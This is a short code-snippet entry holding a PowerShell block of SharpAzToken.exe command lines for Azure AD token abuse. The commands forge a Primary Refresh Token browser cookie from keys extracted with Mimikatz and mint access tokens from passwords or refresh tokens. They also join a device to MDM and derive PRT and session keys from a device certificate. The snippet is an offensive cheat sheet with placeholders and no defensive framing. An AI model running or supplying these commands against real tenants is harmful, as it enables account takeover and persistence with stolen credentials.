---
id: 2a25e514-9719-42cd-b92f-f2c6c08b3902
type: code
language: Powershell
verified: false
created_at: '2023-05-24T07:20:33.108340+00:00'
updated_at: '2023-05-24T07:21:35.677276+00:00'
---

# Code Snippet 2a25e514

**Language**: Powershell

```powershell
# Create a PRT-Cookie for the browser
SharpAzToken.exe cookie --derivedkey <Key from Mimikatz> --context <Context from Mimikatz> --prt <PRT from Mimikatz>

# Create a token
SharpAzToken.exe token --username <Username> --password <Password>

# Create a token from a refresh token
SharpAzToken.exe token --refreshtoken <RefreshToken>

# Join a deivce to MDM
SharpAzToken.exe mdm --joindevice --accesstoken (or some combination from the token part) --devicename <Name> --outpfxfile <Some path>

# Generate PRT and session key from a Device Certificate (device must be joined to MDM first)
SharpAzToken.exe devicekeys --pfxpath XXXX.pfx --refreshtoken (--prtcookie / ---username + --password )
```
